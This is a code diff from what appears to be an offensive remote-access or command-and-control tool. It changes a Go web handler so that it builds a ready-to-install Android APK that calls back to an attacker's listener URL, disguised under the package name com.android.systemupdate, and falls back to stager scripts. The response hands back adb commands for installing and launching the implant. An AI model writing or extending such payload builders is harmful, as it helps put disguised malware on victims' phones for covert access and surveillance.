@@ -115,11 +115,31 @@ func (w *WebUI) handlePayloadGenerate(rw http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(rw).Encode(resp)
 
 	case "android":
-		output, err := payloads.GenerateAndroidPayload(req.ListenerURL, "build/payloads")
-		if err != nil {
-			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: err.Error()})
+		// Try to build a ready-to-install APK first
+		apkPath, err := payloads.BuildAndroidAPK(req.ListenerURL, "build/payloads")
+		if err == nil {
+			info, _ := os.Stat(apkPath)
+			size := "unknown"
+			if info != nil {
+				size = fmt.Sprintf("%.1f KB", float64(info.Size())/1024)
+			}
+			AddPayloadRecord("android", filepath.Base(apkPath), apkPath, size, req.ListenerURL)
+			json.NewEncoder(rw).Encode(PayloadResponse{
+				Success:  true,
+				Message:  fmt.Sprintf("Android APK built: %s (%s)\nInstall: adb install %s\nLaunch: adb shell am start -n com.android.systemupdate/.MainActivity", apkPath, size, apkPath),
+				Filename: filepath.Base(apkPath),
+				FilePath: apkPath,
+				Size:     size,
+				Type:     "android",
+			})
 		} else {
-			json.NewEncoder(rw).Encode(PayloadResponse{Success: true, Message: output, Type: "android", FilePath: "build/payloads/"})
+			// Fallback: generate stager scripts if SDK not available
+			output, err2 := payloads.GenerateAndroidPayload(req.ListenerURL, "build/payloads")
+			if err2 != nil {
+				json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: fmt.Sprintf("APK build failed: %v\nScript fallback also failed: %v", err, err2)})
+			} else {
+				json.NewEncoder(rw).Encode(PayloadResponse{Success: true, Message: fmt.Sprintf("APK build unavailable (%v)\nGenerated stager scripts instead:\n%s", err, output), Type: "android", FilePath: "build/payloads/"})
+			}
 		}
 
 	case "ios":
